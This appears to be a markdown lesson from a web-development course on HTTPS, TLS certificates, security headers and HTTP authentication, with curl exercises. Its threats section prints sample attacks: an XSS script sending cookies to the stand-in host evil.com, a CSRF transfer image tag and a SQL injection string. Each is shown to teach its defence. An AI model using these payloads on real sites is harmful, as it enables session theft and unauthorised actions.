# 09 — HTTPS & Security

## 🤔 HTTP vs HTTPS

```
HTTP  = HyperText Transfer Protocol                (NOT encrypted)
HTTPS = HyperText Transfer Protocol SECURE          (encrypted with TLS)
```

```
HTTP:
Browser ──── "password=secret123" ──── Server
              ^ Anyone in between can READ this!

HTTPS:
Browser ──── "x7#kQ!9$mP..." ──── Server
              ^ Encrypted! Only browser & server can read it.
```

> **Rule:** NEVER send sensitive data over HTTP. ALWAYS use HTTPS.

---

## 🔐 TLS (Transport Layer Security)

HTTPS uses **TLS** (formerly called SSL) to encrypt communication.

### What TLS Provides:

| Property            | What it means                                              |
|---------------------|------------------------------------------------------------|
| **Encryption**      | Data is scrambled — can't be read by eavesdroppers         |
| **Authentication**  | You can verify you're talking to the real server           |
| **Integrity**       | Data can't be tampered with in transit                     |

### TLS Versions:
| Version | Status                    |
|---------|---------------------------|
| SSL 2.0 | ❌ Deprecated (insecure)  |
| SSL 3.0 | ❌ Deprecated (insecure)  |
| TLS 1.0 | ❌ Deprecated             |
| TLS 1.1 | ❌ Deprecated             |
| TLS 1.2 | ✅ Still widely used      |
| TLS 1.3 | ✅ Latest & recommended   |

---

## 📜 TLS Certificates

How does your browser know it's talking to the **real** google.com and not a fake?

### Certificate Chain:
```
Root CA (Certificate Authority)      ← Pre-installed in your OS/browser
  │                                     (DigiCert, Let's Encrypt, etc.)
  └── Intermediate CA
        │
        └── Server Certificate        ← google.com's certificate
              Contains:
              - Domain name (google.com)
              - Public key
              - Issuer (who signed it)
              - Validity dates
              - Digital signature
```

### How Certificate Verification Works:
1. Server sends its certificate to browser
2. Browser checks if the certificate is signed by a trusted CA
3. Browser checks the domain name matches
4. Browser checks the certificate hasn't expired
5. If all checks pass → ✅ green lock icon

```bash
# See a site's TLS certificate
curl -v https://www.google.com 2>&1 | grep -A10 "Server certificate"

# See detailed certificate info
openssl s_client -connect www.google.com:443 -servername www.google.com </dev/null 2>/dev/null | openssl x509 -noout -text | head -30
```

---

## 🛡 Common Web Security Threats

### 1. Man-in-the-Middle (MITM) Attack
```
Browser ──── Attacker ──── Server
              (reads/modifies traffic)
```
**Protection:** HTTPS (TLS encryption)

### 2. Cross-Site Scripting (XSS)
Attacker injects malicious JavaScript into a website:
```html
<!-- Attacker puts this in a comment field -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```
**Protection:** 
- `Content-Security-Policy` header
- `HttpOnly` cookies (can't be read by JS)
- Input sanitization

### 3. Cross-Site Request Forgery (CSRF)
Attacker tricks your browser into making requests to a site you're logged into:
```html
<!-- On evil.com, this image tag makes a request to your bank -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```
**Protection:**
- `SameSite` cookie attribute
- CSRF tokens
- Check `Origin`/`Referer` headers

### 4. SQL Injection
```
Username: admin' OR '1'='1
```
**Protection:** Parameterized queries, input validation

### 5. Clickjacking
Attacker loads your site in a hidden iframe and tricks user into clicking:
**Protection:** `X-Frame-Options: DENY` header

---

## 🛡 Security Headers

These response headers protect your site:

### Strict-Transport-Security (HSTS)
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
- Forces HTTPS for the specified duration (1 year = 31536000 seconds)
- `includeSubDomains` — applies to all subdomains too
- `preload` — browser will NEVER connect via HTTP (even first time)

### Content-Security-Policy (CSP)
```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; img-src *; style-src 'self' 'unsafe-inline'
```
- Controls what resources the page can load
- `default-src 'self'` — only load resources from same origin
- `script-src` — where scripts can come from
- Prevents XSS by blocking inline scripts and unauthorized sources

### X-Content-Type-Options
```
X-Content-Type-Options: nosniff
```
- Prevents browser from guessing the content type
- Stops MIME-type sniffing attacks

### X-Frame-Options
```
X-Frame-Options: DENY
```
- `DENY` — page can't be loaded in any iframe
- `SAMEORIGIN` — only same-origin iframes allowed

### Referrer-Policy
```
Referrer-Policy: strict-origin-when-cross-origin
```
- Controls what info is sent in the `Referer` header
- Prevents leaking sensitive URL info to other sites

### Permissions-Policy
```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```
- Controls which browser features the page can use
- `camera=()` — no camera access allowed
- `geolocation=(self)` — only same-origin can use geolocation

---

## 🔑 Authentication Methods in HTTP

### 1. Basic Auth
```
Authorization: Basic bmFtYW46cGFzc3dvcmQ=   (base64 of "naman:password")
```
- ⚠️ NOT secure without HTTPS (base64 is encoding, NOT encryption)

### 2. Bearer Token (JWT)
```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibmFtYW4ifQ.abc
```
- Token contains user info (encoded, optionally signed)
- Stateless — server doesn't need to store session

### 3. API Key
```
X-API-Key: your-api-key-here
# or
Authorization: ApiKey your-api-key-here
# or in query param (less secure)
GET /api/data?api_key=your-key
```

### 4. OAuth 2.0
- Lets you "Login with Google/GitHub/etc."
- Complex flow involving authorization codes and access tokens
- You'll learn this in depth later

---

## 🧪 Try It Yourself

```bash
# 1. Compare HTTP vs HTTPS
curl -v http://httpbin.org/get 2>&1 | head -15
curl -v https://httpbin.org/get 2>&1 | head -15

# 2. Check security headers on popular sites
curl -sI https://github.com | grep -iE "strict|x-frame|x-content|content-security|referrer-policy"
curl -sI https://www.google.com | grep -iE "strict|x-frame|x-content|content-security"

# 3. See TLS version used
curl -v https://www.google.com 2>&1 | grep "SSL connection\|TLS"

# 4. Try Basic Auth
curl -u naman:password123 https://httpbin.org/basic-auth/naman/password123

# 5. Try Bearer Token
curl -H "Authorization: Bearer my-fake-token" https://httpbin.org/bearer
```

---

## 📝 Key Takeaways

- HTTPS = HTTP + TLS encryption — always use it for sensitive data
- TLS provides encryption, authentication, and integrity
- Certificates verify the server's identity via Certificate Authorities
- Security headers (HSTS, CSP, X-Frame-Options) protect against common attacks
- Know the main attack types: MITM, XSS, CSRF, SQL injection, clickjacking
- Use proper authentication: Bearer tokens > Basic auth
- Always set `HttpOnly`, `Secure`, and `SameSite` on sensitive cookies

---

**← Previous:** [08 — Cookies & Sessions](../08_cookies_and_sessions/lesson.md)
**Next →** [10 — Practical Project](../10_practical_project/lesson.md)
